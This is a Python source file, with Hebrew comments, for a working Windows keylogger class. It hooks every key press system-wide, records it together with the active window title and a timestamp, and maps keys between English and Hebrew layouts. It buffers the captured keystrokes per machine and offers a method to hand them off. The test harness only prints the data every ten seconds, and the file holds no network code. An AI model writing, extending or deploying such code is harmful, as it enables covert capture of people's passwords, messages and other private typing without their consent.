import time
import keyboard, re, unicodedata
from datetime import datetime
import pygetwindow as gw
import ctypes

# ====== מיפוי QWERTY → עברית ======
HEBREW_MAP = {
    'a': 'ש', 'b': 'נ', 'c': 'ב', 'd': 'ג', 'e': 'ק',
    'f': 'כ', 'g': 'ע', 'h': 'י', 'i': 'ן', 'j': 'ח',
    'k': 'ל', 'l': 'ך', 'm': 'צ', 'n': 'מ', 'o': 'ם',
    'p': 'פ', 'q': '/', 'r': 'ר', 's': 'ד', 't': 'א',
    'u': 'ו', 'v': 'ה', 'w': "'", 'x': 'ס', 'y': 'ט',
    'z': 'ז'
}

# ====== מיפוי עברית → אנגלית ======
ENGLISH_MAP = {v: k for k, v in HEBREW_MAP.items()}

def get_current_language():
    """בודק מה שפת המקלדת הפעילה כרגע (Windows בלבד)"""
    user32 = ctypes.windll.user32
    hwnd = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(hwnd, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    lang_id = klid & (2**16 - 1)
    return hex(lang_id)  # למשל: 0x409 אנגלית, 0x40d עברית


class KeyLogger:
    def __init__(self, machine_name):
        self.machine_name = machine_name
        self.running = True
        self.buffer = {}

    def clean_title(self, title):
        if not title:
            return "Unknown"
        title = "".join(c for c in title if unicodedata.category(c)[0] != "C")
        title = re.sub(r"^\(\d+\)\s*", "", title)
        return title.replace(" - Microsoft Edge","").replace(" - Google Chrome","").strip()

    def format_key(self, k):
        """המרת מקש בהתאם לשפה הנוכחית"""
        special = {"space": " ", "enter": "\n", "backspace": "<BS>"}
        if k in special:
            return special[k]

        lang = get_current_language()

        if lang == "0x40d":  # עברית
            return HEBREW_MAP.get(k, k)
        elif lang == "0x409":  # אנגלית (US)
            # אם במקרה הגיע תו עברי, נתרגם אותו חזרה לאנגלית
            return ENGLISH_MAP.get(k, k)
        else:
            return k

    def log_event(self, e):
        if not self.running:
            return

        date = datetime.now().strftime("%Y-%m-%d")
        minute = datetime.now().strftime("%H:%M")
        window = self.clean_title(getattr(gw.getActiveWindow(),"title",""))

        d = self.buffer.setdefault(self.machine_name, {}).setdefault(date, {}).setdefault(minute, {}).setdefault(window, "")
        self.buffer[self.machine_name][date][minute][window] = d + self.format_key(e.name)

    def get_and_clear_buffer(self):
        data = self.buffer
        self.buffer = {}
        return data

    def stop_and_continue(self, status):
        self.running = status

    def start(self):
        keyboard.on_press(self.log_event)


if __name__ == "__main__":
    kl = KeyLogger("Dniel")
    try:
        kl.start()
        print("[KeyLogger started, press CTRL+C to stop]")

        while True:
            time.sleep(10)  # כל 10 שניות – רק בשביל בדיקה
            data = kl.get_and_clear_buffer()
            if data:
                print("\n--- Captured Data ---")
                print(data)
                print("---------------------")

    except KeyboardInterrupt:
        print("\n[Stopped by user]")
        data = kl.get_and_clear_buffer()
        print("Final Data captured:", data)